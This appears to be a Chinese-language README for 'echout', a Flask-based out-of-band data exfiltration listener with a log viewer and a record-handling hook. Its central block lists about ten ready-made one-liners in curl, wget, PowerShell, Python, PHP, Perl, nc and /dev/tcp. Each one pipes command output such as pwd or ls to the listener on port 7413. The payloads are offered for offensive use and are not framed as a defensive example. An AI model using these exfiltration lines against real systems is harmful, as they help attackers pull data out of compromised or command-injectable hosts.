# echout

数据外带平台

[Get .py](https://github.com/fb0sh/echout/releases)

# 友好的日志界面

<img width="2307" height="1375" alt="image" src="https://github.com/user-attachments/assets/ca705553-791c-49d6-9d03-753fce19e7d2" />

# 外带数据的方式
```bash
pwd | curl --data-binary @- http://0.0.0.0:7413/
wget --method=POST --body-data="$(pwd)" http://0.0.0.0:7413/ -O -
ls | powershell -c "irm -Uri http://0.0.0.0:7413/ -Method POST -Body ([Console]::In.ReadToEnd())"
python3 -c 'import os,socket;b=os.popen("pwd").read();s=socket.create_connection(("0.0.0.0",7413));s.send(b"POST / HTTP/1.1\r\nHost:x\r\nContent-Length:%d\r\n\r\n%b"%(len(b),b.encode()))'
python2 -c 'import os,socket;b=os.popen("pwd").read();s=socket.create_connection(("0.0.0.0",7413));s.send("POST / HTTP/1.1\r\nHost:x\r\nContent-Length:%d\r\n\r\n%%s"%(len(b),b))'
php -r '$b=`pwd`; $s=fsockopen("0.0.0.0",7413); fwrite($s,"POST / HTTP/1.1\r\nHost:x\r\nContent-Length:".strlen($b)."\r\n\r\n$b");'
perl -e 'use IO::Socket::INET;$b=`pwd`;IO::Socket::INET->new(PeerAddr=>"0.0.0.0",PeerPort=>7413)->send("POST / HTTP/1.1\r\nHost:x\r\nContent-Length:".length($b)."\r\n\r\n$b")'
b=$(pwd); echo -ne "POST / HTTP/1.1\r\nHost: x\r\nContent-Length:${#b}\r\n\r\n$b" | nc 0.0.0.0 7413
b=$(pwd); echo -ne "POST / HTTP/1.1\r\nHost: x\r\nContent-Length: ${#b}\r\n\r\n$b" > /dev/tcp/0.0.0.0/7413
curl http://0.0.0.0:7413/$(pwd)
```

# 可供编程的链式调用
```python
class EchoRecord:
    request: Request
    date: str
    ip: str
    data: str
    headers: str
```

```python
def handle_record(record: EchoRecord):
    print(record)
```

可以在此处进行后续的处理

# how to use?

1. 安装 python3
2. `pip install flask`
3. `python echout.py`
